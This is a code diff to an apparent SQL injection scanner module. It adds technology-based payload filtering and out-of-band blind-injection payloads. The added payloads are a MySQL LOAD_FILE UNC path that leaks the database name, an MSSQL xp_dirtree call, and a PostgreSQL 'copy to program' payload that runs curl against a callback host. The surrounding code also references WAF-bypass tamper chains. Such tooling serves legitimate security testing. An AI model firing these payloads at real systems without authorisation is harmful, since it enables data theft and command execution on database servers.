@@ -4,14 +4,12 @@ SQL Injection detection
 """
 
 import sys
-import os
 import time
 import httpx
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
 
-sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-
 from utils.request import (
+    get_oob_client,
     get_thread_count,
     increment_vulnerability_count,
     smart_request,
@@ -23,9 +21,10 @@ from modules.payloads import (
     SQLI_PAYLOADS,
     SQLI_ERRORS,
 )
+from utils.payload_filter import PayloadFilter
 from modules.smart_payload import probe_sqli_context
 from concurrent.futures import ThreadPoolExecutor, as_completed
-
+from utils.request import ScanExceptions
 
 def detect_sqli(text):
     """Check response for SQL error patterns"""
@@ -34,7 +33,6 @@ def detect_sqli(text):
         if error.lower() in text_lower:
             return error
     return None
-
 
 def _check_sqli_error(
     resp, payload, target_name, url_or_action, method, data, smart_payloads, source=None
@@ -59,7 +57,6 @@ def _check_sqli_error(
             "source": source,
         }
     return None
-
 
 def _test_sqli_form_input(inp, inputs, method, target, delay):
     """Test a single form input for SQLi (helper for threading)"""
@@ -282,10 +279,9 @@ def _test_sqli_form_input(inp, inputs, method, target, delay):
                                         if vuln_found:
                                             return vuln_found
 
-        except Exception:
+        except ScanExceptions:
             pass
     return None
-
 
 def _test_sqli_param(param, params, parsed, delay):
     """Test a single URL param for SQLi (helper for threading)"""
@@ -449,23 +445,29 @@ def _test_sqli_param(param, params, parsed, delay):
                                     if vuln_found:
                                         return vuln_found
 
-        except Exception:
+        except ScanExceptions:
             pass
     return None
 
-
-def scan_sqli(url, forms, delay, threads=None):
+def scan_sqli(url, forms, delay, options=None, threads=None):
     """Scan for SQL injection vulnerabilities (threaded)"""
     from utils.tamper import get_tamper_chain
 
     if threads is None:
         threads = get_thread_count()
+        
+    options = options or {}
+    target_context = options.get("target_context")
 
     # Apply tamper chain for WAF bypass variants
     chain = get_tamper_chain()
     payloads = list(SQLI_PAYLOADS)
     if chain.active:
         payloads = chain.apply_list(payloads)
+
+    # Apply tech filtering
+    if target_context:
+        payloads = PayloadFilter.filter_payloads(payloads, target_context)
 
     log_info(f"Testing SQLi with {len(payloads)} payloads ({threads} threads)...")
     vulns = []
@@ -515,7 +517,7 @@ def scan_sqli(url, forms, delay, threads=None):
                 result = future.result()
                 if result:
                     vulns.append(result)
-            except Exception:
+            except ScanExceptions:
                 pass
 
     # ── AI Exploit Agent (Final Escalation) ──
@@ -557,11 +559,30 @@ def scan_sqli(url, forms, delay, threads=None):
 
     return vulns
 
-
-def scan_blind_sqli(url, forms, delay):
+def scan_blind_sqli(url, forms, delay, options=None):
     """Scan for blind SQL injection using time-based detection"""
-    log_info(f"Testing Blind SQLi with {len(BLIND_SQLI_PAYLOADS)} payloads...")
+    options = options or {}
+    target_context = options.get("target_context")
+    
+    payloads = list(BLIND_SQLI_PAYLOADS)
+    if target_context:
+         payloads = PayloadFilter.filter_payloads(payloads, target_context)
+         
+    log_info(f"Testing Blind SQLi with {len(payloads)} payloads...")
     vulns = []
+
+    oob_client = get_oob_client()
+    oob_payloads = []
+    if oob_client and oob_client.ready:
+        # MySQL: LOAD_FILE or HEX based OOB
+        oob_url = oob_client.generate_payload("SQLi", "form_input")
+        # Removing http:// prefix for DNS-based tricks if URL contains the IP
+        # For LocalOOBProvider it's http://IP:PORT/token
+        oob_payloads.extend([
+            f"'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT DATABASE()),'.{oob_url.replace('http://', '')}\\\\a'))-- ",
+            f"'; EXEC master..xp_dirtree '//{oob_url.replace('http://', '')}/a'-- ",
+            f"'; copy (select '') to program 'curl {oob_url}'-- "
+        ])
 
     # Test forms for Blind SQLi
     for form in forms:
@@ -579,16 +600,18 @@ def scan_blind_sqli(url, forms, delay):
             continue
 
         for inp in inputs:
-            # Skip Submit buttons as they rarely contain SQLi and cause false positives/delays
+            # Skip Submit buttons
             if inp.lower() in ["submit", "btnsubmit", "login", "security"]:
                 continue
 
-            for payload in BLIND_SQLI_PAYLOADS:
-                # Use only sleep payloads or time-based ones
+            current_payloads = payloads + oob_payloads
+            for payload in current_payloads:
+                # Use only sleep payloads, time-based ones, or OOB payloads
                 if (
                     "SLEEP" in payload.upper()
                     or "pg_sleep" in payload.lower()
                     or "WAITFOR" in payload.upper()
+                    or (oob_client and oob_client.ready and any(p in payload for p in ["LOAD_FILE", "xp_dirtree", "curl"]))
                 ):
                     # Preserve original values logic
                     data = inputs.copy()
@@ -663,8 +686,9 @@ def scan_blind_sqli(url, forms, delay):
     params = parse_qs(parsed.query)
 
     for param in params:
-        for payload in BLIND_SQLI_PAYLOADS:
-            if "SLEEP" in payload.upper() or "pg_sleep" in payload.lower():
+        current_payloads = BLIND_SQLI_PAYLOADS + oob_payloads
+        for payload in current_payloads:
+            if "SLEEP" in payload.upper() or "pg_sleep" in payload.lower() or (oob_client and oob_client.ready and any(p in payload for p in ["LOAD_FILE", "xp_dirtree", "curl"])):
                 test_params = params.copy()
                 test_params[param] = [payload]
                 test_url = urlunparse(
@@ -711,7 +735,7 @@ def scan_blind_sqli(url, forms, delay):
                                 f"Ignored SQLi false positive on {param} (Network delay: {base_elapsed:.2f}s)"
                             )
                             break
-                except Exception:
+                except ScanExceptions:
                     pass  # Individual blind param payload failure
 
     return vulns
